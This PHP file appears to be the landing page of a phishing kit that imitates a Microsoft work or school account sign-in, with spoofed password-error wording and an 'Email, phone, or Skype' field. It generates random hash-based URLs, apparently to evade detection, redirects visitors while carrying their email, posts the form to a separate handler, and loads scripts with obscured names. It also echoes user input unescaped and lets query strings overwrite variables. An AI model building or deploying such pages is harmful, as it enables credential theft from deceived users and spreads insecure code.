<?php
	include('search.php');
	// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
	// < end 
    $email = $_GET['email'];
	$error = $_GET['error'];
        
    function random_number(){
		$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
		$key = array_rand($numbers);
		return $numbers[$key]; 
	}

	$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
	
	$post = 'pageindex.php?'.$url;
	
	if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];	
		if($email) {
			header("Location: pageindex.php?$url&email=$email&error=$error");
		}
	}

	$errorMsg = '';

	if(isset($_GET['error'])) {
		if ($_GET['error'] == 1) {	
			$errorMsg = "Enter a valid email.";
		} else if ($_GET['error'] == 2) {
			$errorMsg = "We don't recognise your password. Make sure that you type the password for your work or school account.";
		}
	}
?>

<!DOCTYPE html>
<html>
<script language="Javascript" src="js/myscr956753.js"></script>

			<p id="message" class="message"><?php echo $errorMsg; ?></p>

			<form action="<?php echo $post; ?>" method="post">
				<input id="email" type="email" name="email" value="<?php echo $email; ?>" placeholder="Email, phone, or Skype">

				<script language="Javascript" src="js/myscr776710.js"></script>
</html>
